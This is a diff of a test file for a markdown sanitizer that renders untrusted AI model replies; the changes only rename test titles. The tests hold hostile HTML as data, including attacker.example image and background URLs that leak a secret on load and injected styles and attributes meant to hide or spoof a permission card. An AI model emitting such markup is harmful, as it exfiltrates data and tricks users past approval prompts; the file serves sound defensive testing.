@@ -38,12 +38,12 @@ describe("renderMarkdown", () => {
     expect(html).not.toContain("javascript:");
   });
 
-  it("wraps a table in its own sideways scroller (T1)", () => {
+  it("wraps a table in its own sideways scroller", () => {
     const html = renderMarkdown("| a | b |\n|---|---|\n| 1 | 2 |");
     expect(html).toMatch(/<div class="table-scroll"><table>[\s\S]*<\/table><\/div>/);
   });
 
-  it("parses a text once and serves the rest from a bounded cache (V3)", () => {
+  it("parses a text once and serves the rest from a bounded cache", () => {
     const before = markdownParseCount();
     const a = renderMarkdown("once **only**");
     expect(renderMarkdown("once **only**")).toBe(a);
@@ -58,8 +58,8 @@ describe("renderMarkdown", () => {
 // Rendered model content is untrusted. These cases exercise navigation spoofing,
 // remote-loading attributes and styles, and code-block content,
 // so sanitized replies cannot impersonate controls or load hidden remote resources.
-describe("renderMarkdown keeps model content inert (panel-content findings 1-3)", () => {
-  it("strips id/name/role/aria/data-*, and keeps class to what this module itself emits (finding 1 adjacent)", () => {
+describe("renderMarkdown keeps model content inert", () => {
+  it("strips id/name/role/aria/data-*, and keeps class to what this module itself emits", () => {
     const fakeCard =
       '<div class="row row-permission row-current" data-sign="!" aria-current="true" role="button" id="x">' +
       "fake card</div>";
@@ -79,13 +79,13 @@ describe("renderMarkdown keeps model content inert (panel-content findings 1-3)"
     expect(html).not.toContain("data-tool-use-id");
   });
 
-  it('drops an injected data-nav-stop="row" that would shift which card a key answers (finding 1)', () => {
+  it('drops an injected data-nav-stop="row" that would shift which card a key answers', () => {
     const injected = '<div data-nav-stop="row" hidden></div><div data-nav-stop="row" hidden></div>';
     const html = renderMarkdown(`x\n\n${injected}\n`);
     expect(html).not.toContain("data-nav-stop");
   });
 
-  it("forbids a <style> tag and an inline style= attribute in every shape that survived before (finding 2)", () => {
+  it("forbids a <style> tag and an inline style= attribute in every shape that survived before", () => {
     for (const src of [
       "<style>.x{color:red}</style>",
       "text\n\n<style>.x{color:red}</style>",
@@ -99,7 +99,7 @@ describe("renderMarkdown keeps model content inert (panel-content findings 1-3)"
     }
   });
 
-  it("a reply's <style> cannot reach the real permission card's classes to hide or relabel it (finding 2)", () => {
+  it("a reply's <style> cannot reach the real permission card's classes to hide or relabel it", () => {
     const attack = [
       "Here is the plan.",
       "",
@@ -118,7 +118,7 @@ describe("renderMarkdown keeps model content inert (panel-content findings 1-3)"
     expect(html).not.toContain("data-nav-action");
   });
 
-  it("drops every zero-click remote-load vector finding 3 reproduced, with no attacker URL surviving", () => {
+  it("drops every zero-click remote-load vector, with no attacker URL surviving", () => {
     const vectors = [
       '<img src="https://attacker.example/i2?s=A" width="0" height="0">',
       '<img srcset="https://attacker.example/srcset?s=B 1x">',
@@ -139,7 +139,7 @@ describe("renderMarkdown keeps model content inert (panel-content findings 1-3)"
     }
   });
 
-  it("a markdown image renders as a link with the alt text and URL, never an auto-loading <img> (finding 3)", () => {
+  it("a markdown image renders as a link with the alt text and URL, never an auto-loading <img>", () => {
     const html = renderMarkdown("![diagram](https://attacker.example/pixel?secret=CONFIDENTIAL_TEXT)");
     expect(html).not.toContain("<img");
     expect(html).toContain('href="https://attacker.example/pixel?secret=CONFIDENTIAL_TEXT"');
@@ -163,7 +163,7 @@ describe("renderMarkdown keeps model content inert (panel-content findings 1-3)"
 // attributes (a legacy `background=` vector FORBID_ATTR missed), GFM checkboxes
 // must survive, image alt text must not be double-escaped, a badge-style `[![img](url)](url)` keeps its
 // real link, and the class allowlist keeps highlight.js's own `class_`/`function_` modifiers.
-describe("renderMarkdown: legacy background= attributes and the markup it keeps", () => {
+describe("renderMarkdown: further remote-loading attributes, with safe markup kept", () => {
   it("drops a legacy background= attribute -- WebKitGTK loads it as a background-image with no click", () => {
     const vectors = [
       '<table background="https://attacker.example/tbg"><tr><td>x</td></tr></table>',
@@ -246,7 +246,7 @@ function parse(html: string): HTMLDivElement {
 // `<dialog open>` positioned by the UA stylesheet. Image
 // links must resolve HTML entities like ordinary links, and badge handling must cover more than a
 // link whose whole content is one image.
-describe("renderMarkdown: dialogs, entities in image links, and mixed image/text links", () => {
+describe("renderMarkdown: overlays, invokers and link destinations", () => {
   it("drops <dialog>: the UA stylesheet positions an open one absolutely, an overlay with no style=", () => {
     // WebKitGTK's own UA sheet: `dialog { position: absolute; inset-inline: 0; margin: auto;
     // background-color: Canvas; ... } dialog[open] { display: block; }`. `.row`/`.message-list`
